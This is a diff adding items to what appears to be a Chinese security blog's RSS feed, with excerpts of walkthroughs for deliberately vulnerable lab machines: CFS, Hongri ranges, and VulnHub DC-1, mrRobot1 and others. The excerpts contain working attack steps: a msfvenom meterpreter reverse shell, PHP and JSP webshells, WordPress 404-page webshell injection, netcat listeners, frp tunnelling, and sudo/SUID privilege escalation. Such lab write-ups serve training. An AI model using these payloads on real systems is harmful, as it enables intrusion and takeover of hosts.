@@ -22,5 +22,196 @@ sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /us
 这种格式可以执行root权限命令，来找一下flag
 sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
 </item>
+<item>
+    <title>CFS三层靶机</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</guid>
+    <description><![CDATA[CFS三层靶机 0X01配置环境 分别打开三台靶机，输入账号密码进入
+rootteamssix.com 查看三台靶机的ip地址，
+确保Target1一个在192.168.1.0网段、另一个在192.168.22.0网段
+确保Target2在192.168.1.0、192.168.22.0、192.168.33.0网段
+确保Target3在192.168.33.0网段
+确保kali2022在192.168.1.0网段
+确认完毕后来到jkali，通过192.168.1.0网段的IP地址打开Tagrget1的宝塔面板
+地址：http://targ1的IP:8888/a768f109/账号：eaj3yhsl密码：41bb8fee 打开192.168.1.130的80端口，确保kali可以访问到
+Target2也同理，账号密码如下
+地址：http://你的IP:8888/2cc52ec0/账号：xdynr37d密码：123qwe.. 配置22网段 我这里是192.168.22.128
+然后删除Targ2的1网段网卡，因为1网段用途就是方便kali配Targ2的环境
+目前环境配置完成
+攻击机kali: 192.168.1.128Targ1 CentOS: 192.168.1.130 192.168.22.129Targ2 Ubuntu: 192.168.22.128 192.168.33.128 Targ3 Windows: 192.168.33.33 0X02信息收集getshell 主机探活
+扫描kali同网段的主机
+发现192.168.1.130，以及带出一些端口，这就是Targ1，我们对其进行渗透
+访问80端口找可利用点
+ThinkPHP5的框架，那就找框架的漏洞呗
+直接上工具梭
+上传马
+成功getshell
+0x03内网渗透 上线msf 生成linux木马
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f elf&gt;1.elf 上传到蚁剑
+msf监听
+msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.1.128set LPORT 4444exploit 执行1.]]></description>
+</item>
+<item>
+    <title>三层靶机frp</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/</guid>
+    <description><![CDATA[https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
+环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 + 端口扫描
+nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
+外网打点 先访问靶机1的80端口
+tp5 直接工具梭
+顺利拿到shell
+蚁剑查看网络
+内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
+上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
+./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
+有两种方式进行利用：
+1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
+代理转发—重点 使用frp方式。
+frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
+一级代理
+配置服务端frps.ini
+[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端]]></description>
+</item>
+<item>
+    <title>红日靶场 1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</guid>
+    <description><![CDATA[红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
+win7上要多添加一个桥接网卡可以分配一个真实ip
+三台靶机的默认开机密码都为hongrisec@2019
+win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
+win7提示重启，重启后打开phpstudy
+ipconfig查看
+可以看到分配的真实ip
+访问ip得到phpstudy探针，本机也可以
+同时我们需要保持外网、域网络防火墙为未开启状态
+02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
+80端口也就是刚才的phpstudy探针，可以看看有无利于点
+最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
+那去找一下mysql的后台登录页面，
+dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
+查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
+访问刚才定义的日志页面 ，可以getshell
+传入shell ,连接蚁剑
+select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库]]></description>
+</item>
+<item>
+    <title>红日靶场2</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</link>
+    <pubDate>Tue, 20 Aug 2024 23:52:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</guid>
+    <description><![CDATA[红日靶场2 拓扑图 默认密码：1qaz@WSX
+0x01环境搭建 我是参考此视频
+https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
+自定义一个10.10.10.x 的网络 我命名为VMnet5
+进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
+0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
+漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
+跳转到404
+尝试使用WeblogicScan脚本探测漏洞：
+python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
+github准备好exp工具进行利用
+-u 检测 -f上传木马
+得到一个url 可以直接执行命令
+上帝视角去看靶机的shell.jsp的文件位置
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
+传入马比较棘手且比赛也没有上帝视角，另寻其他方法
+getShell 找到个工具weblogic漏洞检测工具
+输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
+&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.]]></description>
+</item>
+<item>
+    <title>VulnHub — CH4INRULZ_v1.0.1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/</link>
+    <pubDate>Mon, 19 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/</guid>
+    <description><![CDATA[VulnHub — CH4INRULZ_v1.0.1 扫描ip和端口 nmap 192.168.164.0/24 可以用dirb 扫描.bak备份文件 dirb http://192.168.164.137/ -x .bak curl直接读文件
+curl http://192.168.164.137/index.html.bak &amp;lt;!-- 我将使用 frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 作为 .htpasswd 文件来保护开发路径 --&amp;gt; 用join来解密 这是个用户名和密码
+frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
+将串字符保存到1.txt 然后john工具爆破密码 john 1.txt john 1.txt --show 得到一组用户名和密码， frank frank!!!
+登录刚才的development目录 ，成功登录
+然后有提示 uploader目录需要安全审查 访问后可以上传图片
+传上图片马（构造的gif图片） 显示成功上传，但是不知道路径
+8011端口收集信息 能够上传图片马，但不知道路径，这时候选择回头看看8011端口 扫目录看到api目录 访问/api 正在开发的api接口， 猜测files_api.php 可以文件读取
+没有file参数发送给我 ，所以猜测这里可以传file参数,尝试了一下是post传参 那么post传file参数可以进行文件读取 刚才上传文件后在/development/uploader/upload.php有回显，尝试读取这个upload.php
+并没有读取出源码，而是执行了php文件 这里继续用filter伪协议进行读取 ，成功得到源码 FRANKuploads/ 得到上传文件存储路径
+nc 反弹shell nc 先监听webshell里设置的4444端口
+文件读取刚刚上传的webshell.gif ，成功让gif文件以PHP执行
+反弹shell 成功
+www-data权限 脏牛提权 内核版本&gt;2.4.22 。2016年之前 都可以脏牛提权 版本符合]]></description>
+</item>
+<item>
+    <title>VulnHub — DC-1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/</link>
+    <pubDate>Mon, 19 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/</guid>
+    <description><![CDATA[VulnHub — DC-1 信息收集 主机发现 不清楚什么原因，这个靶机的ip一直扫不到 偶尔又扫到了，不知道什么问题
+既然扫到了, 就不管了，80端口开了 信息收集 直接访问网站扫目录
+Drupal 是使用PHP语言编写的开源内容管理框架（CMF），由内容管理系统(CMS)和PHP开发框架共同构成。 形象的说Drupal是一个福袋CMS的PHP开发框架
+msf漏洞发现 1启动：msfconsole2搜索利用脚本：search Drupal3进入利用脚本：use4查看需要参数：show opitons5设置参数：set6执行攻击：run msf启动 然后search一下 找exp 不少东西，其实可以试试用哪个，这里就直接用drupal_drupalgeddon2 也就是序号4
+看options 只需要配置RHOSTS 也就是靶机地址
+payload也已经配置好了
+session 传入 直接进入shell
+查看权限www-data 进入交互式
+python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; SUID提权（find） Set User ID是一种权限类型，允许用户使用指定用户的权限执行文件。那些具有suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，井且我们发现二进制文件启用了suid位，那么这些文件/程序/命令可以root权限运行. SUID的目的就是:让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。 1、查看具有SUID的二进制可执行文件 find / -user root -perm -4000 -print 2&amp;gt;/dev/null2、一直可用来提权的linux可行性的文件列表如下：Nmap 、 Vim 、 find 、 Bash 、 More 、 Less 、Nano 、 cp3、利用find获得root权限shell find / -name cron.]]></description>
+</item>
+<item>
+    <title>VulnHub — Lampiao</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--lampiao/</link>
+    <pubDate>Mon, 19 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--lampiao/</guid>
+    <description><![CDATA[VulnHub — Lampiao 信息收集 msfconsole 脏牛提权
+信息收集 扫描ip和端口 namp -sP 扫描网段 ，得到靶机ip 利用nmap的TCP半开放扫描，对网站端口进行快速探测
+nmap -sS -p 1-65535 192.168.164.135 该扫描方式因为它不打开一个完全的TCP连接，所以是使用频率最高的扫描方式。扫描结果发现开放22、80、1898端口
+可以通过-A 来详细扫描， -p扫描所有的端口 ，时间长一点
+nmap -A 192.168.164.133 -p 0-65535 可以看到1898端口也是http服务
+访问web 扫描目录 继续收集信息, 在1898 端口有页面
+80端口没有啥有用功能，在1898 端口 扫目录
+得到框架的版本信息 Drupal 7.54 漏洞发发现与利用 msfconsole 使用 1.搜索利用脚本: search2.进入利用脚本: use exploit/unix/ftp/proftpd_133c_backdoor3.查看需要设置的参数: show options4.设置参数: set rhost 192.168.1.45.设置payload: set payload cmd/unix/reverse6.查看payload需要设置的参数: show options7.设置payload参数:set rhost 192.168.1.48.输入命令: run, 执行攻击，成功getshell, 井且直接为root权限 1，搜索脚本 search 2，利用脚本 use 3，查看需要参数 show options]]></description>
+</item>
+<item>
+    <title>VulnHub — Me-and-My-Girlfriend-1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/</link>
+    <pubDate>Mon, 19 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/</guid>
+    <description><![CDATA[VulnHub — Me-and-My-Girlfriend-1 安装好靶场镜像，打开就这样
+在kali 查自己ip 用 nmap扫描 ，看有没有其他段 ，顺利找到靶场ip
+然后访问靶场ip ，查看源码 源码提示，用X-Forwarded-For 修改成 本地ip ，直接用插件改了
+顺利进入网站 ​​​
+进入注册页面，成功注册，然后进行登录
+登录进来，观察到这里可以修改 user_id的号， 修改试试
+试出来5时候，名字是alice ，正是本题女主的名字 F12成功看到密码 用ssh 命令 进行远程登录
+格式如下，密码输入以上密码就可，然后成功连接，可以操作了 隐藏文件有个 my_secret ,访问进去 继续查看
+成功看到flag1.txt ，获得第一个flag
+这题还需要提权，查看alice的权限 ，需要用php 提权
+php 回调bash提权 sudo php -r &#39;system(&#34;/bin/bash&#34;);&#39; 权限 升为 root ，直接find flag文件啦]]></description>
+</item>
+<item>
+    <title>VulnHub — mrRobot1</title>
+    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/</link>
+    <pubDate>Mon, 19 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/</guid>
+    <description><![CDATA[VulnHub — mrRobot1 信息收集 nmap 192.168.164.0/24 22端口被关闭了 访问80网站，很像一个终端的页面
+访问robots.txt拿到第一个flag
+还有一个dic文件，访问下载下来是个字典文件
+扫描目录 发现有wordpress后台页面 sort 排序 -u 去重 sort -u fsocity.dic &amp;gt; dic.txt 将其保存为新的字典 ，去登录页面尝试用户名和密码的爆破
+用户名密码爆破 直接用burp来爆破 先爆用户名 得到是elliot
+爆出密码ER28-0652 成功登录后台 WordPress后台反弹shell 1.wordpress后台登录地址http://192.168.164.138/wordpress/wp-admin2.修改404页面，写入webshell （自行设置监听IP和端口）appearance----editer----404.php3.在攻击机上面开启监听4444端口 nc -lvpp 4444.访问404页面，反向连接到主机 （404地址固定）http://192.168.164.138/wordpress/wp-content/themes/twentyfifteen/404.php5.交互式连接python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入后台 找到编辑404页面 将webshell脚本写进去 保存 nc -lvvp 4444 然访问404.php
+连接成功 交互式连接 python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入home目录 就有个robot用户
+进入 发现有flag 但是没有权限查看 还有一个password MD5加密的 可以读取到 这个md5直接拿去解密]]></description>
+</item>
 </channel>
 </rss>
